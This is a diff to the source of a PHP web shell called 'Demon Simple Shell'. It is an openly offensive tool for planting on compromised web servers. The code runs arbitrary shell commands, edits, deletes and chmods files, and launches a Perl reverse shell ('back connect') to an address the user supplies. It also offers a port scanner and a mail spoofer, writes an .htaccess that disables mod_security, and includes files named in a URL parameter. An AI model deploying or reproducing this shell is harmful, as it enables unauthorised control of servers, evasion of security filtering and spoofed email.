@@ -1,47 +1,45 @@
-<!--# Demon Simple Sheller (Developed By Arash Khazaei A.K.A Xodiak And The Nonexistent)-->
+<!--(Demon Simple Shell Developed By Arash Khazaei A.K.A Xodiak And The Nonexistent)-->
 <html>
 <head>
-    <title>D3m0N Simple Sheller</title>
+    <title>Demon Simple Shell</title>
     <style>
         p{
             font-family: Courier;
             color: darkgreen;
             font-size: 15px;
-            text-shadow:black;
-
         }
-		
-		a:link
-		{
-		color:inherit;
-		text-decoration:none
-		}
-		
-		a:visited 
-		{
-		color:inherit;
-		text-decoration:none;  
-		}
-		
-		a:active 
-		{
-		color:inherit;
-		text-decoration:none; 
-		}
-		
-		a:hover
-		{
-		color:inherit;
-		text-decoration:none; 
-		}
-		
+        
+        a:link
+        {
+        color:inherit;
+        text-decoration:none
+        }
+        
+        a:visited 
+        {
+        color:inherit;
+        text-decoration:none;  
+        }
+        
+        a:active 
+        {
+        color:inherit;
+        text-decoration:none; 
+        }
+        
+        a:hover
+        {
+        color:inherit;
+        text-decoration:none; 
+        }
+        
         #normaltext{
             font-family: Courier;
             color: darkgreen;
             font-size: 15px;
             text-shadow:black;
         }
-		
+        
         #textareas {
             font-family: monospace;
             color: darkgreen;
@@ -66,21 +64,22 @@
 <div id="normaltext">
     <?php
     echo "Uname -a~:".php_uname();
-	echo "<br>";
-	echo "Id(User):";
-	echo passthru("id");
     echo "<br>";
-	$host= gethostname();
-	$ip = gethostbyname($host);
-	echo "Server Ip:" . $ip;
-	echo "<br>";
-	echo "Your Ip:" . $_SERVER['REMOTE_ADDR'];
-	echo "<br>";
+    echo "Id(User):";
+    echo passthru("id");
+    echo "<br>";
+    $host= gethostname();
+    $ip = gethostbyname($host);
+    echo "Server Ip:" . $ip;
+    echo "<br>";
+    echo "Your Ip:" . $_SERVER['REMOTE_ADDR'];
+    echo "<br>";
     echo "PHP Version~:".phpversion();
     echo "<br> PWD~: ".getcwd(); echo '/';
     echo "<br>Mysql Version~: ".mysql_get_server_info();
     echo "<br>Apache Version~: ".apache_get_version();
     ?>
+    <br/>Disabled Functions: <?php error_reporting(E_ALL); $disabled_functions = ini_get('disable_functions'); if ($disabled_functions!='') { $arr = explode(',', $disabled_functions); sort($arr); echo '<font color=darkred>Disabled Functions:<br>'; for ($i=0; $i<count($arr); $i++){ echo $arr[$i].' - </font>';} } else { echo '<font color=lightgreen>All Functions Are Enabled</font>';} ?> 
     <hr>
 </div>
 <center>
@@ -98,8 +97,8 @@
 <?php
 if ((!isset($_GET['p']) || $_GET['p']=="0") && !isset($_GET['edit']))
 {
-	?>
-	<hr>
+    ?>
+    <hr>
 <center>
 <p>CMD~#</p>
 <form method="post" action="" enctype="multipart/form-data">
@@ -121,14 +120,14 @@ if (isset($_POST['wdir']))
 $wdir = $_POST['wdir'];
 }
 if (isset($_POST['command'])){
-    passthru($command);
+    htmlspecialchars(passthru($command));
 }
 if($command == ""){
-    passthru("ls -lart $wdir");
+    htmlspecialchars(passthru("ls -lart $wdir"));
 
 }else
 {
-    echo $command;
+    echo htmlspecialchars($command);
 }
 ?>
 </textarea>
@@ -136,9 +135,14 @@ if($command == ""){
 <br>
 <div align="left">
 <form method="post" action="">
-<font style="font-family: Courier;color: darkgreen;font-size: 15px;text-shadow:black;">Working Directory:</form><input type="text" style="width: 50%; color:darkgreen;background-color:#000000" name="wdir" value="<?php echo $wdir;?>"/>
+<font style="font-family: Courier;color: darkgreen;font-size: 15px;text-shadow:black;">Working Directory:</font><input type="text" style="width: 50%; color:darkgreen;background-color:#000000" name="wdir" value="<?php echo $wdir;?>"/>
 <input type="submit" name="wsub" style="color:darkgreen;background-color:#000000" value="Go"/>
 <input type="submit" name="home" style="color:darkgreen;background-color:#000000" value="Shell Home"/>
+</form>
+
+<form method="get" action="">
+<font style="font-family: Courier;color: darkgreen;font-size: 15px;text-shadow:black;">Create/Edit Files:</font><input type="text" name="edit" style="width: 50%; color:darkgreen;background-color:#000000" value="File Name">
+<input type="submit" value="Edit" style="color:darkgreen;background-color:#000000">
 </form>
 </div>
 <hr>
@@ -206,7 +210,7 @@ else
 <input type="text" style="color:darkgreen;background-color:#000000" value="File Name" name="chmodname"/>
 <select name="chmodmod" style="color:darkgreen;background-color:#000000">
 <option value="0755" selected="selected">0755</option>
-<option value="777">777</option>0644
+<option value="0777">777</option>0644
 <option value="0644">0644</option>
 </select>
 <input type="submit" style="color:darkgreen;background-color:#000000" name="chmodsub" value="Go"/>
@@ -214,40 +218,32 @@ else
 <?php
 if (isset($_POST['chmodname']))
 {
-	$chmodname = $_POST['chmodname'];
-	$chmodmod =(int) $_POST['chmodmod'];
+    $chmodname = $_POST['chmodname'];
+    $chmodmod =(int) $_POST['chmodmod'];
     system("chmod $chmodmod $chmodname");
-	unset($_POST['chmodname']);
+    unset($_POST['chmodname']);
 }
 ?>
 <hr>
-<P>Delete File</P>
 <form method="post" action="">
-<input type="text" style="color:darkgreen;background-color:#000000" name="delname" value="File Name"/>
+<p style="text-align: 10px">Delete File:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Create Directory:</p> <input type="text" style="color:darkgreen;background-color:#000000" name="delname" value="Delete File"/>
 <input type="submit" style="color:darkgreen;background-color:#000000" name="delsub" value="Go"/>
+------------
+<input type="text" name="newdirn" style="color:darkgreen;background-color:#000000" value="Create Directory">
+<input type="submit" value="Go" style="color:darkgreen;background-color:#000000">
 </form>
 <?php
+if(isset($_POST['delname'])){
 $delname=$_POST['delname'];
 unlink($delname);
+}
 ?>
-<hr>
-<p>Create Or Edit File</p>
-<form method="get" action="">
-<input type="text" name="edit" style="color:darkgreen;background-color:#000000" value="File Name">
-<input type="submit" value="Go" style="color:darkgreen;background-color:#000000">
-</form>
-<hr>
-<p>Create Directory</p>
-<form action="" method="post">
-<input type="text" name="newdirn" style="color:darkgreen;background-color:#000000" value="Dir Name">
-<input type="submit" value="Go" style="color:darkgreen;background-color:#000000">
-</form>
 <?php
 if (isset($_POST['newdirn']))
 {
-	$newdirn = $_POST['newdirn'];
-	system("mkdir $newdirn");
-	unset($_POST['newdirn']);
+    $newdirn = $_POST['newdirn'];
+    system("mkdir $newdirn");
+    unset($_POST['newdirn']);
 }
 ?>
 </center>
@@ -257,7 +253,7 @@ if (isset($_POST['newdirn']))
 <?php
 if (isset($_GET['p']) && $_GET['p']=="1")
 {
-	?>
+    ?>
 <center>
 <hr>
 <p style="font-size: medium"> Back Connect </P>
@@ -287,14 +283,14 @@ if (!connect(SERVER, pack "SnA4x8", 2, $port, inet_aton($host))) {die("[-] Unabl
   //Start Of Execute
   if (isset($_POST['perlbcip']) && isset($_POST['perlbcport']))
   {
-	  $perlbcip = $_POST['perlbcip'];
-	  $perlbcport = $_POST['perlbcport'];
-	  $handle = fopen("0xbc.pl", "w");
-	  fwrite($handle, $script);
-	  fclose($handle);
-	  system("perl 0xbc.pl $perlbcip $perlbcport");
-	  unset($_POST['perlbcip']);
-	  unset($_POST['perlbcport']);
+      $perlbcip = $_POST['perlbcip'];
+      $perlbcport = $_POST['perlbcport'];
+      $handle = fopen("0xbc.pl", "w");
+      fwrite($handle, $script);
+      fclose($handle);
+      system("perl 0xbc.pl $perlbcip $perlbcport");
+      unset($_POST['perlbcip']);
+      unset($_POST['perlbcport']);
   }
 ?>
 <!-- End Of Perl Back Connect -->
@@ -428,16 +424,16 @@ $phpscript =  '
         unset($_POST['phpbcip']);
         unset($_POST['phpbcport']);
     }
-	echo "</center>";
-	}
+    echo "</center>";
+    }
     ?>
 
 <!-- End Of Php Back Connect -->  
 <?php
 if (isset($_GET['p']) && $_GET['p']=="2")
 {
-	?>
-	<center>
+    ?>
+    <center>
 <hr>
 <p style="font-size: medium"> Port Scanner </P>
 <form action="" method="post">
@@ -585,11 +581,11 @@ if(isset($_POST['mailto']) && isset($_POST['subject']) && isset($_POST['msg']) &
 }
             ?>
             </center>
-			<hr>
+            <hr>
         <?php
         }
         ?>
-		 <!--END Mail Spoofer -->
+         <!--END Mail Spoofer -->
 
                 <!-- Start String Encoder -->
                 <?php
@@ -727,7 +723,7 @@ include($_GET["ss"]);
                         $aphttaccessCreate = fopen(".htaccess", "w");
                         $aphttaccessSource =
                             "
-             #Created By Xodiak And TheNoneExsistent
+             #Created By Xodiak And TheNonexsistent
              <IfModule mod_security.c>
              Sec------Engine Off
              Sec------ScanPOST Off
@@ -762,7 +758,7 @@ include($_GET["ss"]);
                 <?php
                 if(isset($_GET['p']) && $_GET['p'] == '9'){
                     ?>
-					 <form action="" method="post" enctype="application/x-www-form-urlencoded" name="selfkill">
+                     <form action="" method="post" enctype="application/x-www-form-urlencoded" name="selfkill">
 
                     <input type="submit" name="selfkill" style="width: 10%; height: 10%; color:darkgreen;background-color:#000000" value="Remove Shell!!" onclick="alert('Shell Removed SuccessFully')"/>
 
@@ -783,44 +779,44 @@ include($_GET["ss"]);
 
                 <?php } ?>
                 <!-- Self Kill End -->
-				<!--File Edit Start-->
-				<?php
+                <!--File Edit Start-->
+                <?php
                 if(isset($_GET['edit'])){
                     ?>
-					<?php
-					$filename = $_GET['edit'];
-					$filename = getcwd().'/'.$filename;
-					$fwhandle = fopen($filename,"r");
-					$contents = fread($fwhandle, filesize($filename));
-					fclose($fwhandle);
-					$fhandle = fopen($filename,"w");
-					echo "<font style=\"font-family: Courier;color: darkgreen;font-size: 15px;text-shadow:black;\">File Name: </font><font style=\"font-family: Courier;color: darkred;font-size: 15px;text-shadow:black;\">$filename</font>";
-					if (isset($_POST['done']) && $_POST['done'] == 1)
-					{
-					echo "<br>";
-					echo "<font style=\"font-family: Courier;color: lightblue;font-size: 15px;text-shadow:black;\">Saved Successfully!</font>";
-					unset($_POST['done']);
-					}
-					?>
-					<form action="" method="post">
-					<textarea name="fecontent" id="textareas" spellcheck="false" style="height: 10cm;width: 22cm;color:darkgreen;background-color:#000000"><?php
-					echo htmlspecialchars($contents);
-					?></textarea>
-					<br>
-					<br>
-					<input name="fesub" type="submit" style="color:darkgreen;background-color:#000000" value="Save"/>
-					<input name="done" type="hidden" value="1"/>
-					</form>
-					<?php
-					if (isset($_POST['fecontent']))
-					{
-						$newcontent = $_POST['fecontent'];
-						fwrite($fhandle, $newcontent);
-						fclose($fhandle);
-						unset($_POST['fecontent']);
-						unset($newcontent);
-					}
-					} ?>
-					<!--File Edit End-->
+                    <?php
+                    $filename = $_GET['edit'];
+                    $filename = getcwd().'/'.$filename;
+                    $fwhandle = fopen($filename,"r");
+                    $contents = fread($fwhandle, filesize($filename));
+                    fclose($fwhandle);
+                    $fhandle = fopen($filename,"w");
+                    echo "<font style=\"font-family: Courier;color: darkgreen;font-size: 15px;text-shadow:black;\">File Name: </font><font style=\"font-family: Courier;color: darkred;font-size: 15px;text-shadow:black;\">$filename</font>";
+                    if (isset($_POST['done']) && $_POST['done'] == 1)
+                    {
+                    echo "<br>";
+                    echo "<font style=\"font-family: Courier;color: lightblue;font-size: 15px;text-shadow:black;\">Saved Successfully!</font>";
+                    unset($_POST['done']);
+                    }
+                    ?>
+                    <form action="" method="post">
+                    <textarea name="fecontent" id="textareas" spellcheck="false" style="height: 10cm;width: 22cm;color:darkgreen;background-color:#000000"><?php
+                    echo htmlspecialchars($contents);
+                    ?></textarea>
+                    <br>
+                    <br>
+                    <input name="fesub" type="submit" style="color:darkgreen;background-color:#000000" value="Save"/>
+                    <input name="done" type="hidden" value="1"/>
+                    </form>
+                    <?php
+                    if (isset($_POST['fecontent']))
+                    {
+                        $newcontent = $_POST['fecontent'];
+                        fwrite($fhandle, $newcontent);
+                        fclose($fhandle);
+                        unset($_POST['fecontent']);
+                        unset($newcontent);
+                    }
+                    } ?>
+                    <!--File Edit End-->
 </body>
 </html>
